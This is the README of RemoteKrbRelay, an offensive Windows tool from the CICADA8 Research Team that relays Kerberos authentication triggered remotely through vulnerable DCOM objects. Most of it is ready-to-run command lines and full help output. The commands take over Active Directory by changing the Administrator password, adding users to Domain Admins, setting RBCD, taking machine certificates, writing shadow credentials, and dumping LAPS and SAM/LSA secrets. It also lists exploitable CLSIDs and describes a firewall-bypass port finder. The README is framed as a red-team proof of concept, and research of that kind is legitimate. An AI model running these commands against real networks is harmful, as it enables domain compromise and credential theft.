```shell
                            /\_/\____,
                  ,___/\_/\ \  ~     /
                  \     ~  \ )   XXX
                    XXX     /    /\_/\___,
                       \o-o/-o-o/   ~    /
                        ) /     \    XXX
                       _|    / \ \_/
                    ,-/   _  \_/   \
                   / (   /____,__|  )
                  (  |_ (    )  \) _|
                 _/ _)   \   \__/   (_
                (,-(,(,(,/      \,),),)

                CICADA8 Research Team
                From Michael Zhmaylo (MzHmO)
```

# RemoteKrbRelay

You probably know [KrbRelay](https://github.com/cube0x0/KrbRelay) and [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp), but what if I told you it could be done remotely? With RemoteKrbRelay this becomes a reality.


# TL;DR

Learn more about CertifiedDCOM [here](https://blackhat.com/asia-24/briefings/schedule/#certifieddcom--the-privilege-escalation-journey-to-domain-admin-with-dcom-37519). CertifiedDCOM allows you to trigger an ADCS machine account:
```shell
# CertifiedDCOM (Abuse AD CS by setting RBCD)
  .\RemoteKrbRelay.exe -rbcd -victim adcs.root.apchi -target dc01.root.apchi -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -cn FAKEMACHINE$

# CertifiedDCOM (Abuse ADCS to get Machine cert)
   .\RemoteKrbRelay.exe -adcs -template Machine -victim adcs.root.apchi -target dc01.root.apchi -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3

# CertifiedDCOM (Abuse ADCS with ShadowCreds)
  .\RemoteKrbRelay.exe -shadowcred -victim adcs.root.apchi -target dc01.root.apchi -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -forceshadowcred
```

There's also the [SilverPotato](https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/) exploit. You can use it to abuse sessions. Including a domain administrator session on a third-party host.
```shell
# Change user password
  .\RemoteKrbRelay.exe -chp -victim dc01.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -chpuser Administrator -chppass Lolkekcheb123! -secure

# Add user to group
  .\RemoteKrbRelay.exe -addgroupmember -victim computer.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -group "Domain Admins" -groupuser petka

# Dump LAPS passwords
  .\RemoteKrbRelay.exe -laps -victim mssql.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83

# Send LDAP Whoami request from relayed user
  .\RemoteKrbRelay.exe -ldapwhoami -victim win10.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83

# Trigger authentication from another session
  .\RemoteKrbRelay.exe -ldapwhoami -victim domainadminhost.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -session 1
```

# Details
Now, you have four folders in front of you:
- `Checker` - old version of the checker for detecting vulnerable DCOM objects;
- `Checkerv2.0` - new version of the checker for detecting vulnerable DCOM objects;
- `Exploit` - RemoteKrbRelay.exe :) 
- `FindAvailablePort` - a tool for bypassing a firewall when using an exploit. 

## Checker
So, let's start with Checker. You can use it to detect vulnerable DCOM objects. A vulnerable DCOM object can be considered to be:
- The COM server within which the DCOM object is running must be run as another user or as a system. But never as `NT AUTHORITY\LOCAL SERVICE`, since it uses empty creds to authenticate from the network;
- You must have `RemoteLaunch`, `RemoteActivation` permissions. This is [LaunchPermissions](https://learn.microsoft.com/ru-ru/windows/win32/com/launchpermission);
- Impersonation level should be `RPC_C_IMP_LEVEL_IDENTIFY` and higher. `RPC_C_IMP_LEVEL_IDENTIFY` is a default value;
- U should have `RemoteAccess` permissions (or they should be emply). This is [AccessPermission](https://learn.microsoft.com/ru-ru/windows/win32/com/accesspermission).

For easy detection, you can use Checkerv2.0. It supports output in csv and xlsx formats.
```shell
PS A:\ssd\Share\RemoteKrbRelay\Checkerv2.0\Checkerv2.0\bin\Debug> .\Checkerv2.0.exe -h

                            /\_/\____,          /\     /\
                  ,___/\_/\ \  ~     /            \ _____\
                  \     ~  \ )   XXX               (_)-(_)
                    XXX     /    /\_/\___,      Checkerv2.0 Collection
                       \o-o/-o-o/   ~    /
                        ) /     \    XXX
                       _|    / \ \_/
                    ,-/   _  \_/   \
                   / (   /____,__|  )
                  (  |_ (    )  \) _|
                 _/ _)   \   \__/   (_
                (,-(,(,(,/      \,),),)

                CICADA8 Research Team
                From Michael Zhmaylo (MzHmO)

Check.exe
Small tool that allow you to find vulnerable DCOM applications

[OPTIONS]
-outfile : output filename
-outformat : output format. Accepted 'csv' and 'xlsx'
-showtable : show the xlsx table when it gets filled
-h/--help : shows this windows
```

Example:
```shell
.\Checkerv2.0.exe -outfile win10 -outformat xlsx
```
And u will receive such output:
![изображение](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/4f2f22c7-dd0a-4eef-a630-4cce0f9c55df)

The columns will contain the DCOM object CLSIDs, names, and LaunchPermission and AccessPermission. 
![изображение](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/4d6d0876-f3ae-453e-9c26-e618f61bc71d)

Try searching for sppui (CLSID `{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}`, APPID `{0868DC9B-D9A2-4f64-9362-133CEA201299}`) and CertSrv Request (CLSID `{d99e6e74-fc88-11d0-b498-00a0c90312f3}`) objects and understand why they are vulnerable.

Don't use Checker, use only Checkerv2.0 pls :3 

## FindAvailablePort

A small tool to discover a port on which to raise a malicious DCOM server. See details [here](https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html) (Remote -> Local Potato).

![изображение](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/c1edd59d-3a07-42ee-bc6e-6c724d7c10ff)

Practice using the concept of a local port. Rewrite RemotePotato0 to a local port. Trust me, this is useful.

## Exploit
I added quite a bit of different functionality to the exploit. Note that it provides enough functionality to abuse DCOM objects. I've also listed a few CLSIDs in Help for abuse. These CLSIDs were publicly known, there just wasn't a POC to abuse them. There are quite a few vulnerable DCOM objects, work with the checker and find them all!

```shell
PS A:\ssd\Share\RemoteKrbRelay\Exploit\RemoteKrbRelay\bin\x64\Debug> .\RemoteKrbRelay.exe -h

                            /\_/\____,
                  ,___/\_/\ \  ~     /
                  \     ~  \ )   XXX
                    XXX     /    /\_/\___,
                       \o-o/-o-o/   ~    /
                        ) /     \    XXX
                       _|    / \ \_/
                    ,-/   _  \_/   \
                   / (   /____,__|  )
                  (  |_ (    )  \) _|
                 _/ _)   \   \__/   (_
                (,-(,(,(,/      \,),),)

                CICADA8 Research Team
                From Michael Zhmaylo (MzHmO)

[HELP PANEL]
        RemoteKrbRelay.exe
        Relaying Remote Kerberos Auth by easy way
        Usage: RemoteKrbRelay.exe [ATTACKS] [REQUIRED OPTIONS] [OPTIONAL PARAMS] [ATTACK OPTIONS] [SWITCHES]

[ATTACKS] (one required!)
        -rbcd : relay to LDAP and setup RBCD
        -adcs : relay to HTTP Web Enrollment and get certificate
        -smb : relay to SMB
        -shadowcred : relay to LDAP and setup Shadow Credentials
        -chp : relay to LDAP and change user password
        -addgroupmember : relay to LDAP and add user to group
        -laps : relay to LDAP and extract LAPS passwords
        -ldapwhoami : relay to LDAP and get info about relayed user

[REQUIRED OPTIONS]
        -target : relay to this target
        -victim : relay this computer
        -clsid : target CLSID to abuse

[OPTIONAL PARAMS]
        -spn : with ticket on this SPN victim will come to us. For ex: ldap/dc01.root.apchi - tkt for RBCD mode , http/dc01.root.apchi - tkt for ADCS mode
        -d/--domain : current (target) domain
        -dc/--domaincontoller : target DC
        -local : current computer hostname. This host will be in OBJREF.

[ATTACK OPTIONS]
        [SMB OPTIONS (Relay to SMB)]
        --smbkeyword : specify 'secrets' or 'service-add' or 'interactive'
        --servicename : service-add cmdlet. Name of new service
        --servicecmd : service-add cmdlet. Commandline of the service

        [ADCS OPTIONS (Relay to HTTP)]
        -template : ADCS Mode only. Template to relay to

        [RBCD OPTIONS (Relay to LDAP)]
        -c/--create :  Create new computer
        -cn/--computername :  Computer name that will be written to msDs-AllowedToActOnBehalfOfOtherIdentity
        -cp/--computerpassword : requires -c switch. Password for new computer
        --victimdn : DN of victim computer

        [CHANGE PASSWORD OPTIONS (Relay to LDAP)]
        -chpuser : the name of the user whose password you want to change
        -chppass : new password

        [ADD GROUP MEMBER OPTIONS (Relay to LDAP)]
        -group : group name
        -groupuser : user to add to the group
        -groupdn : target group DN
        -userdn : target user DN

        [SHADOWCRED OPTIONS (Relay to LDAP)]
        -forceshadowcred : force shadow creds

        [LAPS OPTIONS (Relay to LDAP)]
        -lapsdevice : Optional param. Target computer hostname to dump laps from

[SWITCHES]
        -h/--help : show help
        -debug : show debug info
        -secure : use SSL for connection to LDAP/HTTP/etc
        -p/--port : port to deploy rogue dcom server
        -session : cross-session activation. Useful when instantiating com objects with RunAs value as "The Interactive User"
        -module : default "System". It is for firewall bypass

[EXAMPLES]
        [1] Trigger kerberos authentication from adcs.root.apchi (-victim). Then relay to dc01.root.apchi (-target). And setup RBCD (u can optionally provide -dc because setuping RBCD requires connection to ldap on DC) from adcs.root.apchi to FAKEMACHINE$ (-cn). As a result u can pwn adcs.root.apchi from FAKEMACHINE$ through RBCD
        .\RemoteKrbRelay.exe -rbcd -victim adcs.root.apchi -target dc01.root.apchi -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -cn FAKEMACHINE$

        [2] Trigger krb auth from dc01.root.apchi (-victim). Then relay to win10.root.apchi (-target) and open interactive SMB Console.
        .\RemoteKrbRelay.exe -smb --smbkeyword interactive -victim dc01.root.apchi -target win10.root.apchi -clsid <IDK CLSID FOR THAT xD>

        [3] Trigger krb auth from dc01.root.apchi (-victim). Then relay to win10.root.apchi (-target) and dump SAM/LSA secrets from win10.root.apchi.
        .\RemoteKrbRelay.exe -smb --smbkeyword secrets -victim dc01.root.apchi -target win10.root.apchi -clsid <IDK CLSID FOR THAT xD>

        [4] Trigger krb auth from dc01.root.apchi (-victim). Then relay to win10.root.apchi (-target) and create service.
        .\RemoteKrbRelay.exe -smb --smbkeyword service-add --servicename Hello --servicecmd "c:\windows\system32\calc.exe" -victim dc01.root.apchi -target win10.root.apchi -clsid <IDK CLSID FOR THAT xD>

        [5] Get machine certificate from kerberos relay
        .\RemoteKrbRelay.exe -adcs -template Machine -target dc01.root.apchi -victim win10.root.apchi -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8

        [6] Shadow Creds
        .\RemoteKrbRelay.exe -shadowcred -victim dc01.root.apchi -target dc01.root.apchi -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -forceshadowcred

        [7] Change user password
        .\RemoteKrbRelay.exe -chp -victim dc01.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -chpuser Administrator -chppass Lolkekcheb123! -secure

        [9] Dump LAPS passwords
        .\RemoteKrbRelay.exe -laps -victim dc01.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83

        [10] Send LDAP Whoami request from relayed user
        .\RemoteKrbRelay.exe -ldapwhoami -victim dc01.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83

        [11] Trigger authentication from another session
        .\RemoteKrbRelay.exe -ldapwhoami -victim dc01.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -session 1

[?] Interesting CLSIDs to use
dea794e0-1c1d-4363-b171-98d0b1703586 - Interactive User. U can use with -session switch. U should be in NT AUTHORITY\Interactive
f87b28f1-da9a-4f35-8ec0-800efcf26b83 - Interactive User. U can use with -session switch. U should be in Distributed COM Users or Performance Log Users
3ab092c4-de6a-4cd4-be9e-fdacdb05759c - System account. On victim computer should be installed AD CS
6d5ad135-1730-4f19-a4eb-3f87e7c976bb - System account. On victim computer should be installed AD CS
```

# Examples
I suggest looking at some of the attacks:
- RBCD - relay to LDAP and setup RBCD.
![Pasted image 20240520155730](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/b0c45ea0-92ff-4f8c-9984-0ca15e629aee)

- HTTP ADCS - relay to web enrollment service.
![Pasted image 20240520155547](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/ca34a642-57b6-482f-9965-acd22056ab4f)

- ShadowCred - relay to LDAP and setup ShadowCreds.
![Pasted image 20240529141710](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/f7811781-9e5e-4a74-ae19-33c9353fae9d)

- Add user to group
![Pasted image 20240529170057](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/fe401965-fc89-44e1-ba74-cc1529902e63)

- LDAP Whoami request - It is convenient to combine with CLSID Bruteforce functionality. You can find out which user you are triggering. Try triggering for the first five sessions on all machines in the domain. Wow, that's what, a domain administrator in five minutes? :) 
![Pasted image 20240530214447](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/8274b454-2e6a-4530-b963-2b96191eb3a2)

Supports cross-session activation using `-session`:
![Pasted image 20240530220634](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/13b7adc3-5597-42c8-8388-b6f2f4bcc9d3)

![Pasted image 20240530220705](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/54dfd18e-b99f-450e-998d-91aefdd2cbda)

Also LAPS, changing user password, smb....

Video DEMO:
- [https://youtu.be/1zvycrTTgDU](https://youtu.be/1zvycrTTgDU)

# TO DO LIST
- [ ] Dump GMSA
- [ ] Exchange to exchange relay
- [ ] CLSID Bruteforce
- [ ] Relay with supplemental credentials

# Tips
- [ ] Relay initial OXID Request authentication. [Link](https://www.tiraniddo.dev/2024/04/relaying-kerberos-authentication-from.html). U can test:
```shell
.\RemoteKrbRelay.exe -ldapwhoami -victim win10.vostok.street -target dc01.vostok.street -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -local dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAAA

# but I haven't implemented the relay from Initial OXID Request yet. Do it BRO! :)
# dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAAA <- this is DNS A record that points to kali (thx to CredMarshalTargetInfo() because i can receive tkt on RPCSS/dc01)
```

- [ ] U can get TGT in AP-REQ. What if des cryptography is used?
```shell
.\RemoteKrbRelay.exe -rbcd -victim win10.vostok.street -target dc01.vostok.street -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -spn krbtgt/root.apchi -cn FAKEMACHINE$
```

# Conclusion
The vulnerability is quite serious. Note that this is the minimum POC. You should refine it if you want to use it stably on your Red Team projects. 

# Acknowledgements
- Repos [KrbRelay](https://github.com/cube0x0/KrbRelay) and [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp), with their help I was able to figure out Kerberos Relay
- [BH Asia 2024 Talk](https://blackhat.com/asia-24/briefings/schedule/#certifieddcom--the-privilege-escalation-journey-to-domain-admin-with-dcom-37519)
- [Silver Potato](https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/)

Thanks for not posting the POC on CertifiedDCOM and SilverPotato, I've been stoked to do them on those articles :D
